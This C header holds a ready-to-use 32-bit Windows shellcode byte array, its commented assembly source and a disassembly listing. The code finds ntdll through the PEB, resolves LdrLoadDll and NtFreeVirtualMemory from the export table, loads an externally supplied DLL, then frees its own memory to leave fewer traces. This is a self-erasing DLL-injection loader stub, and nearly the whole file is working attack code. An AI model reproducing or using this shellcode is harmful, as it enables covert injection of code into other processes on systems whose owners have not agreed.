#pragma once

CHAR ShellCode[] =	"\x53\x56\x57\x55\xE8\xA2\x00\x00\x00\x8B\x50\xF3\x8B\x58\xEF"
					"\x53\x52\x55\x89\xE5\x83\xEC\x24\x31\xF6\x56\x68\x64\x44\x6C"
					"\x6C\x68\x72\x4C\x6F\x61\x66\x68\x4C\x64\x89\x65\xFC\x56\x68"
					"\x6D\x6F\x72\x79\x68\x61\x6C\x4D\x65\x68\x69\x72\x74\x75\x68"	
					"\x72\x65\x65\x56\x68\x00\x4E\x74\x46\x44\x89\x65\xF8\x83\xEC"
					"\x03\xE8\x5E\x00\x00\x00\x85\xC0\x74\x2F\x89\x45\xF4\x6A\x0B"
					"\x8B\x75\xFC\x56\xE8\x60\x00\x00\x00\x5B\x5B\x85\xC0\x74\x1B"
					"\x8D\x55\x08\x52\x8B\x55\x04\x52\x31\xD2\x52\x52\xFF\xD0\x6A"
					"\x14\x8B\x75\xF8\x56\xE8\x41\x00\x00\x00\x5B\x5B\x83\xC4\x58"
					"\x5D\x5F\x5E\x5B\x85\xC0\x74\x1B\x59\x68\x00\x80\x00\x00\xBA"
					"\x00\x00\x00\x00\x89\x55\x08\x8D\x55\x08\x52\x8B\x55\x04\x52"
					"\x6A\xFF\x51\xFF\xE0\xC3\x8B\x04\x24\xC3\x31\xF6\x64\x8B\x5E"
					"\x30\x8B\x5B\x0C\x8B\x5B\x14\x8B\x1B\x8B\x5B\x10\x89\xD8\xC3"
					"\x8B\x5D\xF4\x8B\x43\x3C\x01\xD8\x8B\x40\x78\x01\xD8\x8B\x48"
					"\x24\x01\xD9\x89\x4D\xF0\x8B\x78\x20\x01\xDF\x89\x7D\xEC\x8B"
					"\x50\x1C\x01\xDA\x89\x55\xE8\x8B\x50\x14\x31\xC0\x8B\x7D\xEC"
					"\x8B\x74\x24\x04\x31\xC9\xFC\x8B\x3C\x87\x01\xDF\x66\x03\x4C"
					"\x24\x08\xF3\xA6\x74\x0B\x40\x39\xD0\x72\xE3\xB8\x00\x00\x00"
					"\x00\xC3\x8B\x4D\xF0\x8B\x55\xE8\x66\x8B\x04\x41\x8B\x04\x82"
					"\x01\xD8\xC3";

/*
format PE console
use32
entry start

  start: 	   
        push ebx ; Save registers
        push esi
        push edi
        push ebp
		
		call get_eip 
		mov  edx, [eax - 0Dh] ; IN PUNICODE_STRING ModuleFileName
		mov  ebx, [eax - 11h] ; OUT PHANDLE ModuleHandle
		push ebx
		push edx

	; Establish a new stack frame
	push ebp
	mov ebp, esp

	sub esp, 24h 			; Allocate memory on stack for local variables - 6 vars

	; push the function name on the stack
	xor esi, esi
	push esi			    ; null termination
	push 6c6c4464h
	push 616f4c72h  
	pushw 644ch
	mov [ebp-4], esp 		; var4 = "LdrLoadDll\x00", size = 0xa
	
	; push the function name on the stack
	push esi
	push 79726f6dh
	push 654d6c61h
	push 75747269h
	push 56656572h
	push 46744e00h
	inc esp
	mov [ebp-8], esp 		; var8 = "NtFreeVirtualMemory\x00" size = 0x13
	sub esp, 3h				; stack alignment so LdrLoadDll wont return 80000002 error code
	
	; size of two strings is 0x25h
	
	call find_ntdll			; eax is ntdll base address
	test eax, eax
	jz start.end
	mov [ebp-0Ch], eax
	
	push 0Bh
	mov esi, [ebp-4] 	; esi = var4 = "LdrLoadDll\x00"
	push esi
	call find_function
	pop ebx
	pop ebx
	test eax, eax
	jz start.end
	
	
	lea edx, [ebp + 8h] ; OUT PHANDLE ModuleHandle
	push edx
	mov edx, [ebp + 4h] ; IN PUNICODE_STRING ModuleFileName
	push edx
	xor edx, edx
	push edx		; IN ULONG Flags OPTIONAL
	push edx		; IN PWCHAR PathToFile OPTIONAL
	call eax 		; LdrLoadDll
	
	push 14h
	mov esi, [ebp-8] 	; esi = var8 = "NtFreeVirtualMemory\x00"
	push esi
	call find_function
	pop ebx
	pop ebx
	
	.end:
		add esp, 58h	; clear the stack
		pop ebp ; restore all registers and exit
		pop edi
		pop esi
		pop ebx
		
		test eax, eax
		jz start.return
		
		pop ecx ; ret address
		push 0x8000   		; MEM_RELEASE
		mov edx, 0h
		mov [ebp + 8h], edx
		lea edx, [ebp + 8h] 
		push edx 			; PSIZE_T
		mov edx, [ebp + 4h]
		push edx			; PVOID BaseAddress
		push 0xFFFFFFFF		; HMODULE
		push ecx
		jmp eax
	
	.return:
			ret

	get_eip: mov eax, [esp]
		     ret
	
	find_ntdll: xor esi, esi				; esi = 0
				mov ebx, [fs:30h + esi]  	; written this way to avoid null bytes
				mov ebx, [ebx + 0Ch] 
				mov ebx, [ebx + 0x14] 
				mov ebx, [ebx]	
				mov ebx, [ebx + 0x10]		; ebx holds ntdll.dll base address
				mov eax, ebx 				; eax return ntdll.dll base address
				ret
	
	find_function:	mov ebx, [ebp-0Ch]			; ntdll base address
					mov eax, [ebx + 3Ch]		; RVA of PE signature
					add eax, ebx       			; Address of PE signature = base address + RVA of PE signature
					mov eax, [eax + 78h]		; RVA of Export Table
					add eax, ebx 				; Address of Export Table

					mov ecx, [eax + 24h]		; RVA of Ordinal Table
					add ecx, ebx 				; Address of Ordinal Table
					mov [ebp-10h], ecx 			; var16 = Address of Ordinal Table

					mov edi, [eax + 20h] 		; RVA of Name Pointer Table
					add edi, ebx 				; Address of Name Pointer Table
					mov [ebp-14h], edi 			; var20 = Address of Name Pointer Table

					mov edx, [eax + 1Ch] 		; RVA of Address Table
					add edx, ebx 				; Address of Address Table
					mov [ebp-18h], edx 			; var24 = Address of Address Table

					mov edx, [eax + 14h] 		; Number of exported functions

					xor eax, eax 				; counter = 0

					.loop:
							mov edi, [ebp-14h] 	; edi = var16 = Address of Name Pointer Table
							mov esi, [esp + 4]
							xor ecx, ecx

							cld  					; set DF=0 => process strings from left to right
							mov edi, [edi + eax*4]	; Entries in Name Pointer Table are 4 bytes long
													; edi = RVA Nth entry = Address of Name Table * 4
							add edi, ebx       		; edi = address of string = base address + RVA Nth entry
							add cx, [esp + 8] 		; Length of strings to compare
							repe cmpsb        		; Compare the first 8 bytes of strings in 
													; esi and edi registers. ZF=1 if equal, ZF=0 if not
							jz find_function.found

							inc eax 					; counter++
							cmp eax, edx    			; check if last function is reached
							jb find_function.loop 		; if not the last -> loop
     		
							mov eax, 0h
							ret
					.found:
						; the counter (eax) now holds the position of the Function

						mov ecx, [ebp-10h]		; ecx = var16 = Address of Ordinal Table
						mov edx, [ebp-18h]  	; edx = var24 = Address of Address Table

						mov ax, [ecx + eax*2] 	; ax = ordinal number = var16 + (counter * 2)
						mov eax, [edx + eax*4] 	; eax = RVA of function = var24 + (ordinal * 4)
						add eax, ebx 			; eax = address of the Function = 
												; = ntdll.dll base address + RVA of the Function
						ret
*/

/*
Microsoft (R) COFF/PE Dumper Version 14.14.26430.0
Copyright (C) Microsoft Corporation.  All rights reserved.


Dump of file ShellCode.exe

File Type: EXECUTABLE IMAGE

  00401000: 53                 push        ebx
  00401001: 56                 push        esi
  00401002: 57                 push        edi
  00401003: 55                 push        ebp
  00401004: E8 A2 00 00 00     call        004010AB
  00401009: 8B 50 F3           mov         edx,dword ptr [eax-0Dh]
  0040100C: 8B 58 EF           mov         ebx,dword ptr [eax-11h]
  0040100F: 53                 push        ebx
  00401010: 52                 push        edx
  00401011: 55                 push        ebp
  00401012: 89 E5              mov         ebp,esp
  00401014: 83 EC 24           sub         esp,24h
  00401017: 31 F6              xor         esi,esi
  00401019: 56                 push        esi
  0040101A: 68 64 44 6C 6C     push        6C6C4464h
  0040101F: 68 72 4C 6F 61     push        616F4C72h
  00401024: 66 68 4C 64        push        644Ch
  00401028: 89 65 FC           mov         dword ptr [ebp-4],esp
  0040102B: 56                 push        esi
  0040102C: 68 6D 6F 72 79     push        79726F6Dh
  00401031: 68 61 6C 4D 65     push        654D6C61h
  00401036: 68 69 72 74 75     push        75747269h
  0040103B: 68 72 65 65 56     push        56656572h
  00401040: 68 00 4E 74 46     push        46744E00h
  00401045: 44                 inc         esp
  00401046: 89 65 F8           mov         dword ptr [ebp-8],esp
  00401049: 83 EC 03           sub         esp,3
  0040104C: E8 5E 00 00 00     call        004010AF
  00401051: 85 C0              test        eax,eax
  00401053: 74 2F              je          00401084
  00401055: 89 45 F4           mov         dword ptr [ebp-0Ch],eax
  00401058: 6A 0B              push        0Bh
  0040105A: 8B 75 FC           mov         esi,dword ptr [ebp-4]
  0040105D: 56                 push        esi
  0040105E: E8 60 00 00 00     call        004010C3
  00401063: 5B                 pop         ebx
  00401064: 5B                 pop         ebx
  00401065: 85 C0              test        eax,eax
  00401067: 74 1B              je          00401084
  00401069: 8D 55 08           lea         edx,[ebp+8]
  0040106C: 52                 push        edx
  0040106D: 8B 55 04           mov         edx,dword ptr [ebp+4]
  00401070: 52                 push        edx
  00401071: 31 D2              xor         edx,edx
  00401073: 52                 push        edx
  00401074: 52                 push        edx
  00401075: FF D0              call        eax
  00401077: 6A 14              push        14h
  00401079: 8B 75 F8           mov         esi,dword ptr [ebp-8]
  0040107C: 56                 push        esi
  0040107D: E8 41 00 00 00     call        004010C3
  00401082: 5B                 pop         ebx
  00401083: 5B                 pop         ebx
  00401084: 83 C4 58           add         esp,58h
  00401087: 5D                 pop         ebp
  00401088: 5F                 pop         edi
  00401089: 5E                 pop         esi
  0040108A: 5B                 pop         ebx
  0040108B: 85 C0              test        eax,eax
  0040108D: 74 1B              je          004010AA
  0040108F: 59                 pop         ecx
  00401090: 68 00 80 00 00     push        8000h
  00401095: BA 00 00 00 00     mov         edx,0
  0040109A: 89 55 08           mov         dword ptr [ebp+8],edx
  0040109D: 8D 55 08           lea         edx,[ebp+8]
  004010A0: 52                 push        edx
  004010A1: 8B 55 04           mov         edx,dword ptr [ebp+4]
  004010A4: 52                 push        edx
  004010A5: 6A FF              push        0FFFFFFFFh
  004010A7: 51                 push        ecx
  004010A8: FF E0              jmp         eax
  004010AA: C3                 ret
  004010AB: 8B 04 24           mov         eax,dword ptr [esp]
  004010AE: C3                 ret
  004010AF: 31 F6              xor         esi,esi
  004010B1: 64 8B 5E 30        mov         ebx,dword ptr fs:[esi+30h]
  004010B5: 8B 5B 0C           mov         ebx,dword ptr [ebx+0Ch]
  004010B8: 8B 5B 14           mov         ebx,dword ptr [ebx+14h]
  004010BB: 8B 1B              mov         ebx,dword ptr [ebx]
  004010BD: 8B 5B 10           mov         ebx,dword ptr [ebx+10h]
  004010C0: 89 D8              mov         eax,ebx
  004010C2: C3                 ret
  004010C3: 8B 5D F4           mov         ebx,dword ptr [ebp-0Ch]
  004010C6: 8B 43 3C           mov         eax,dword ptr [ebx+3Ch]
  004010C9: 01 D8              add         eax,ebx
  004010CB: 8B 40 78           mov         eax,dword ptr [eax+78h]
  004010CE: 01 D8              add         eax,ebx
  004010D0: 8B 48 24           mov         ecx,dword ptr [eax+24h]
  004010D3: 01 D9              add         ecx,ebx
  004010D5: 89 4D F0           mov         dword ptr [ebp-10h],ecx
  004010D8: 8B 78 20           mov         edi,dword ptr [eax+20h]
  004010DB: 01 DF              add         edi,ebx
  004010DD: 89 7D EC           mov         dword ptr [ebp-14h],edi
  004010E0: 8B 50 1C           mov         edx,dword ptr [eax+1Ch]
  004010E3: 01 DA              add         edx,ebx
  004010E5: 89 55 E8           mov         dword ptr [ebp-18h],edx
  004010E8: 8B 50 14           mov         edx,dword ptr [eax+14h]
  004010EB: 31 C0              xor         eax,eax
  004010ED: 8B 7D EC           mov         edi,dword ptr [ebp-14h]
  004010F0: 8B 74 24 04        mov         esi,dword ptr [esp+4]
  004010F4: 31 C9              xor         ecx,ecx
  004010F6: FC                 cld
  004010F7: 8B 3C 87           mov         edi,dword ptr [edi+eax*4]
  004010FA: 01 DF              add         edi,ebx
  004010FC: 66 03 4C 24 08     add         cx,word ptr [esp+8]
  00401101: F3 A6              repe cmps   byte ptr [esi],byte ptr es:[edi]
  00401103: 74 0B              je          00401110
  00401105: 40                 inc         eax
  00401106: 39 D0              cmp         eax,edx
  00401108: 72 E3              jb          004010ED
  0040110A: B8 00 00 00 00     mov         eax,0
  0040110F: C3                 ret
  00401110: 8B 4D F0           mov         ecx,dword ptr [ebp-10h]
  00401113: 8B 55 E8           mov         edx,dword ptr [ebp-18h]
  00401116: 66 8B 04 41        mov         ax,word ptr [ecx+eax*2]
  0040111A: 8B 04 82           mov         eax,dword ptr [edx+eax*4]
  0040111D: 01 D8              add         eax,ebx
  0040111F: C3                 ret

  Summary

        1000 .flat
*/
